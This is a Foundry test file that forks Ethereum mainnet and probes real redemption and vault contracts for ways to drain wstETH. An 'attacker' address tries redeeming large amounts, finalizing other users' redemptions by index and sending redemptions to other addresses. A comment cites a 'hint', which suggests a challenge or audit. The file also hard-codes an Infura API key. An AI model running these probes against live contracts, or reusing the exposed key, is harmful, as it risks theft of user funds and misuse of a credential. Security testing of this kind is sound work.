// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract FinalizeInvestigation is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_WhyFinalizeFails() public {
        console.log("=== WHY FINALIZE FAILS ===\n");

        vm.startPrank(attacker);
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Redeem large amount
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(50000e18))
        );
        console.log("redeem(50000e18):", s1);

        vm.stopPrank();

        // Warp time
        vm.warp(block.timestamp + 7 days);

        vm.startPrank(attacker);

        // Try finalize
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem:", s2);
        if (!s2 && d2.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_CheckVaultLiquidity() public view {
        console.log("=== CHECK VAULT LIQUIDITY ===\n");

        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH:", vaultBal / 1e18);

        // If we try to redeem 50000 TASSET at ~0.07 exchange rate
        // Expected wstETH = 50000 * 0.07 = 3500
        // Vault only has 3621, so it should work

        // But maybe there's a cap or rate issue
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("totalRedeeming()")
        );
        if (s1) console.log("totalRedeeming:", abi.decode(d1, (uint256)) / 1e18);
    }

    function test_SmallerRedemption() public {
        console.log("=== SMALLER REDEMPTION TEST ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Smaller redeem
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(5000e18))
        );
        console.log("redeem(5000e18):", s1);

        vm.stopPrank();

        vm.warp(block.timestamp + 7 days);

        vm.startPrank(attacker);

        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerWst / 1e18);
        
        if (attackerWst > 0) {
            console.log("Vault drained:", (vaultBefore - IERC20(wstETH).balanceOf(VAULT)) / 1e18);
        }
    }

    function test_FinalizeWithoutOwnRedemption() public {
        console.log("=== FINALIZE WITHOUT OWN REDEMPTION ===\n");

        // The hint about "action chaining" and "proxy attacker owns"
        // Maybe the finalize function doesn't properly check ownership

        vm.warp(block.timestamp + 30 days);

        vm.startPrank(attacker);

        // Try to finalize someone else's redemption
        // totalRedeeming shows 978 TASSET pending

        console.log("Trying to finalize existing redemptions:");

        for (uint i = 0; i < 10; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );
            if (s) {
                console.log("SUCCESS at index:", i);
            }
        }

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_RedeemForOther() public {
        console.log("=== REDEEM FOR OTHER (REDIRECT) ===\n");

        // Maybe we can create a redemption that sends to a different address

        address victim = makeAddr("victim");

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Try redeem with recipient
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeemTo(uint96,address)", uint96(1000e18), victim)
        );
        console.log("redeemTo:", s1);

        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeemFor(address,uint96)", victim, uint96(1000e18))
        );
        console.log("redeemFor:", s2);

        (bool s3, bytes memory d3) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96,address)", uint96(1000e18), victim)
        );
        console.log("redeem(uint96,address):", s3);

        vm.stopPrank();
    }

    function test_ExamineRedemptionIndex() public {
        console.log("=== EXAMINE REDEMPTION INDEX ===\n");

        // How are redemptions indexed?
        // Is it per-user or global?

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create a redemption
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption");

        // Check user-specific redemption info
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("userRedemptions(address)", attacker)
        );
        if (s1) {
            console.log("userRedemptions length:", d1.length);
        }

        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("redemptionOf(address)", attacker)
        );
        if (s2 && d2.length >= 32) {
            console.log("redemptionOf:", abi.decode(d2, (uint256)) / 1e18);
        }

        (bool s3, bytes memory d3) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("pendingRedemption(address)", attacker)
        );
        if (s3 && d3.length >= 32) {
            console.log("pendingRedemption:", abi.decode(d3, (uint256)) / 1e18);
        }

        (bool s4, bytes memory d4) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("getRedemptionRequest(address,uint256)", attacker, 0)
        );
        if (s4) {
            console.log("getRedemptionRequest returned:", d4.length, "bytes");
        }

        vm.stopPrank();
    }
}
